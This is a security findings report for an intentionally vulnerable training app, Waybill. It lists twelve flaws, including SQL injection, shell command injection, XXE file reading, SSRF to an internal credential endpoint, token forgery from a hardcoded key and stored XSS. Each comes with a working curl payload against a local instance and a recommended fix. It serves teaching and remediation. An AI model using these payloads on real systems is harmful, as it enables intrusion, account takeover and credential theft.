# Known vulnerabilities

Waybill is an intentionally insecure training target. This file lists the issues found by an automated security review, with the code location, the recommended fix, and reproduction steps. Line numbers refer to the code at commit `2b2b68b`. Every reproduction step below was run against a local stack (`docker compose up --build -d`) and confirmed to work as described.

Do not deploy this application on a public network.

| # | Severity | Class | Location | Summary |
|---|----------|-------|----------|---------|
| 1 | Critical | SQL injection | `servlets/TrackServlet.java:40` | The search term is concatenated into `LIKE '%...%'` clauses |
| 2 | Critical | OS command injection | `servlets/DepotServlet.java:83-84` | A user-supplied name is placed in a `tar` command run through `/bin/sh -c` |
| 3 | High | XXE | `servlets/DepotServlet.java:42` | `DocumentBuilderFactory` is used without disabling DTDs or external entities |
| 4 | Critical | Hardcoded secret | `Config.java`, `Auth.java:36,43` | The remember-me HMAC key is a constant in source, so tokens can be forged |
| 5 | High | SSRF | `servlets/ProfileServlet.java:29-32` | Avatar URL is fetched server-side; only the `http(s)` prefix is checked and a response preview is returned |
| 6 | High | Stored XSS | `servlets/ShipmentPageServlet.java:64` | Delivery instructions are written into HTML without escaping |
| 7 | High | IDOR | `servlets/ShipmentServlet.java:40` | A shipment is returned by id without checking the owner |
| 8 | High | Business logic | `servlets/ShipmentServlet.java:91` | Only a weight of exactly zero is rejected, so a negative weight yields a negative price and raises the wallet balance |
| 9 | High | Missing authentication | `servlets/WebhookServlet.java:24` | The carrier webhook changes shipment status without any signature or secret |
| 10 | Medium | Weak password hashing | `servlets/AuthServlet.java:60,123` | Passwords are stored as unsalted MD5 |
| 11 | Medium | Sensitive data in logs | `servlets/AuthServlet.java:98` | The password reset token is written to the application log |
| 12 | Medium | Session fixation | `servlets/AuthServlet.java:65` | The session id is not rotated after login |

Also noted: `internal/www/internal/carrier-credentials` is committed to the repository and contains an API key.

## Reproduction steps

All commands below target a local stack started with `docker compose up --build -d` (app on `http://localhost:8080`). Run them only against your own instance. Each step uses a cookie jar file so the session survives between requests.

```bash
BASE=http://localhost:8080
```

### 1. SQL injection — `TrackServlet`

```bash
# Normal use
curl -s "$BASE/api/track?q=Prague"

# A single quote breaks the query, proving the input reaches raw SQL
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/api/track?q=%27"
# -> 500 (Internal server error), instead of an empty/short result list

# A tautology (with a trailing SQL comment) returns every row regardless
# of the search term
curl -s "$BASE/api/track?q=x%25%27%20OR%20%271%27%3D%271%27%20--"
# -> all 5 seeded shipments are returned, not just ones matching "x"
```

### 2. OS command injection — `DepotServlet`

```bash
curl -s -c /tmp/wb.jar -X POST "$BASE/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"courier@waybill.test","password":"Courier#2024"}'

# Inject extra commands into the "name" parameter via shell metacharacters.
# "; true #" makes the overall exit code 0 so the response is still sent.
curl -s -b /tmp/wb.jar \
  "$BASE/api/depot/manifest/export?name=x%3B%20echo%20WB_PWNED%3B%20id%3B%20true%20%23"
# -> the JSON "details" field contains "WB_PWNED" followed by the output
#    of `id` (e.g. uid=0(root)), proving the shell ran commands that were
#    never part of the intended `tar` invocation
```

### 3. XXE — `DepotServlet` manifest import

```bash
curl -s -b /tmp/wb.jar -X POST "$BASE/api/depot/manifest/import" \
  -H 'Content-Type: application/xml' \
  --data-binary @- <<'XML'
<?xml version="1.0"?>
<!DOCTYPE manifest [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<manifest><shipment code="WB-100001"><status>created</status><note>&xxe;</note></shipment></manifest>
XML
# -> the response echoes the "note" field containing the contents of
#    /etc/hostname (read from inside the app container), proving the
#    parser resolved an external entity instead of rejecting the DOCTYPE.
#    (The entity goes in element content, not an attribute value — XML
#    itself forbids external entity references inside attributes.)
```

### 4. Hardcoded remember-me secret — `Auth.java` / `Config.java`

The HMAC key (`waybill-remember-key-2024`) is a constant in the published source, so anyone can mint a valid "remember me" cookie for any user id without ever logging in:

```bash
KEY='waybill-remember-key-2024'
# Forge a token for user id 1 (admin), valid for ~14 days
PAYLOAD_B64=$(printf '1:9999999999999' | base64 | tr '+/' '-_' | tr -d '=')
SIG=$(printf '%s' "$PAYLOAD_B64" | openssl dgst -sha256 -hmac "$KEY" | sed 's/^.* //')
curl -s -b "wb_remember=${PAYLOAD_B64}.${SIG}" "$BASE/api/auth/me"
# -> returns the admin profile, although this client never called /api/auth/login
```

### 5. SSRF — `ProfileServlet` avatar import

```bash
curl -s -c /tmp/wb.jar -X POST "$BASE/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"alice@waybill.test","password":"alice123"}'

# Target the internal carrier-gateway service, not reachable from outside the
# Compose network, instead of an image URL
curl -s -b /tmp/wb.jar -X POST "$BASE/api/profile/photo" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://carrier-gateway:8081/internal/carrier-credentials"}'
# -> "preview" in the response contains the carrier API key JSON, fetched
#    server-side from a host the browser could never reach directly
```

### 6. Stored XSS — `ShipmentPageServlet`

```bash
curl -s -c /tmp/wb.jar -X POST "$BASE/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"alice@waybill.test","password":"alice123"}'

# Shipment 1 belongs to alice (seeded as WB-100001)
curl -s -b /tmp/wb.jar -X POST "$BASE/api/shipments/1/instructions" \
  -H 'Content-Type: application/json' \
  -d "{\"text\":\"<img src=x onerror=\\\"document.title='xss'\\\">\"}"

curl -s -b /tmp/wb.jar "$BASE/shipments/view?id=1" | grep -o '<img[^>]*onerror[^>]*>'
# -> the tag is present verbatim in the HTML response (not escaped),
#    so it executes in a browser that opens this page
```

### 7. IDOR — `ShipmentServlet` GET by id

```bash
curl -s -c /tmp/wb.jar -X POST "$BASE/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"alice@waybill.test","password":"alice123"}'

# Shipment 2 belongs to bob, not alice
curl -s -b /tmp/wb.jar "$BASE/api/shipments/2"
# -> returns bob's recipient address, price and instructions to alice's
#    session, although /shipments/view (the HTML page) correctly blocks it
```

### 8. Negative-weight business logic — `ShipmentServlet` create

```bash
curl -s -c /tmp/wb.jar -X POST "$BASE/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"bob@waybill.test","password":"bob12345"}'

curl -s -b /tmp/wb.jar "$BASE/api/wallet"       # e.g. {"balance":100.00,...}

curl -s -b /tmp/wb.jar -X POST "$BASE/api/shipments" \
  -H 'Content-Type: application/json' \
  -d '{"recipientName":"Test","recipientCity":"Prague","recipientAddress":"Main 1","service":"economy","weightKg":-500}'
# -> "price" in the response is negative, e.g. {"price":-595.50,...}

curl -s -b /tmp/wb.jar "$BASE/api/wallet"       # balance went UP, not down,
                                                 # e.g. {"balance":695.50,...}
```

### 9. Missing authentication — `WebhookServlet`

```bash
# No cookie, no API key, no signature — just the public tracking code
curl -s -X POST "$BASE/api/webhooks/carrier" \
  -H 'Content-Type: application/json' \
  -d '{"trackingCode":"WB-100001","status":"delivered"}'
# -> {"ok":true}; track WB-100001 (curl "$BASE/api/track/WB-100001") and see
#    its status changed, although the request carried no credentials at all
```

### 10. Weak password hashing — `AuthServlet`

```bash
docker compose exec db psql -U waybill -d waybill \
  -c "select email, password_md5 from users where email='alice@waybill.test';"

echo -n "alice123" | openssl dgst -md5
# -> the hex digest matches password_md5 exactly: it is a bare, unsalted
#    MD5 hash, crackable offline with a rainbow table or a GPU in seconds
```

### 11. Sensitive data in logs — `AuthServlet.forgot`

```bash
curl -s -X POST "$BASE/api/auth/forgot" \
  -H 'Content-Type: application/json' \
  -d '{"email":"alice@waybill.test"}'

docker compose exec app sh -c 'grep "password reset token" /usr/local/tomcat/logs/localhost.*.log | tail -1'
# -> the plaintext reset token is printed in Tomcat's application log,
#    so anyone with log access can take over the account without the email
```

### 12. Session fixation — `AuthServlet.login`

```bash
rm -f /tmp/wb.jar
curl -s -c /tmp/wb.jar "$BASE/api/auth/bootstrap"
PRE=$(grep JSESSIONID /tmp/wb.jar | awk '{print $7}')

curl -s -b /tmp/wb.jar -c /tmp/wb.jar -X POST "$BASE/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"alice@waybill.test","password":"alice123"}'
POST=$(grep JSESSIONID /tmp/wb.jar | awk '{print $7}')

[ "$PRE" = "$POST" ] && echo "VULNERABLE: session id unchanged after login ($PRE)"
# -> an attacker who hands a victim a pre-set session id (e.g. via a link
#    that sets the JSESSIONID cookie) inherits the same session once the
#    victim logs in, because the id is never rotated
```

## Recommended fixes

1. **SQL injection:** use bound parameters, for example `LIKE ?` with the value `'%' + q + '%'`.
2. **Command injection:** accept only names matching `^[A-Za-z0-9_-]{1,64}$`, and run `tar` through `ProcessBuilder` with an argument array and no shell, or build the archive in Java.
3. **XXE:** enable `disallow-doctype-decl` and `FEATURE_SECURE_PROCESSING`, turn off external general and parameter entities, and call `setXIncludeAware(false)` and `setExpandEntityReferences(false)`.
4. **Hardcoded secret:** load a random secret of at least 256 bits from the environment. Store remember tokens on the server so they can be revoked, and tie them to the password hash so a reset invalidates them.
5. **SSRF:** resolve the host and block private, loopback and link-local addresses, also after redirects, and pin the resolved IP. Check that the content type is an image and do not return the response body.
6. **Stored XSS:** escape the instructions with the existing `esc()` helper and add a Content-Security-Policy header.
7. **IDOR:** use `owned(u, id)` or check `owner_id == u.id() || u.isStaff()`.
8. **Negative amounts:** require weight greater than zero with a sensible maximum, here and in `QuoteServlet`, and reject non-positive prices.
9. **Webhook:** require an HMAC signature or shared-secret header, compare it in constant time, and optionally restrict source IPs.
10. **Password hashing:** use bcrypt, scrypt or argon2 with a per-user salt.
11. **Logging:** send the token only by email and never log it.
12. **Session fixation:** call `req.changeSessionId()` after a successful login.
13. **Committed credentials:** remove the file from the repository and rotate the key. Removing it from history needs a rewrite of the git history.
